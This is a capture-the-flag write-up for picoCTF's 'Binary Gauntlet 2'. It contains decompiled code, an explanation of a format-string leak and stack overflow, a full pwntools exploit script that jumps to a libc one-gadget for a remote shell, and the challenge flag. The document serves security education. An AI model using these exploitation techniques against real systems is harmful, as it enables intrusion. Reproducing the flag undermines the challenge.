# Binary Gauntlet 2

## Description

Author: madStacks

How does ASLR affect your exploit?
gauntlet nc -v mercury.picoctf.net 59636
The flag for this challenge does not include the standard picoCTF{} wrapper.

## Challenge

The binary is mostly the same as before, except we are no longer given a stack leak.
Also, ASLR is enabled on the server to randomise some addresses.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### Decompiled code

```c
undefined8 main(undefined8 argc, char **argv)
{
    char **var_80h;
    int64_t var_74h;
    char *format;
    
    var_74h._0_4_ = (undefined4)argc;
    format = (char *)sym.imp.malloc(1000);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.printf(format);
    sym.imp.fflush(_reloc.stdout);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.strcpy((int64_t)&var_74h + 4, format, format);
    return 0;
}
```

## Intended Solution

Due to the format string vulnerability, we can still leak a stack address by printing the saved base pointer.
Once we figure out the offset, and potentially add a nop sled to our shellcode, we can again use `strcpy` to write shellcode onto the stack, then overwrite the return address to jump to our shellcode.

This solution is essentially the same as the previous solution, except that we are responsible for getting our own stack leak and finding the offset to the desired address.

## Catch-all Solution

Despite ASLR being enabled, we can still use ret2libc and a one gadget, as we use `printf` to leak the address of `__libc_start_main_ret` from the stack.

Once we have the base address of libc from this leak and the known offset based on the libc version, we can find a one gadget and jump to it.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("mercury.picoctf.net", 59636)


def main():
    r = conn()

    if args.LOCAL:
        context.terminal = ["tmux", "splitw", "-h"]
        #gdb.attach(r, 'b*0x00400727')

    r.sendline('%p ' * 23)

    LibcRet = int(r.recvline().decode().split()[22], 0)

    print(LibcRet)

    LibcBase = LibcRet - 0x021bf7;
    OneGadget = LibcBase + 0x4f432;

    payload = flat({
        0x78: OneGadget,
    })

    print(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag

`35abcfc34466e83a28f548a2099ad06d`

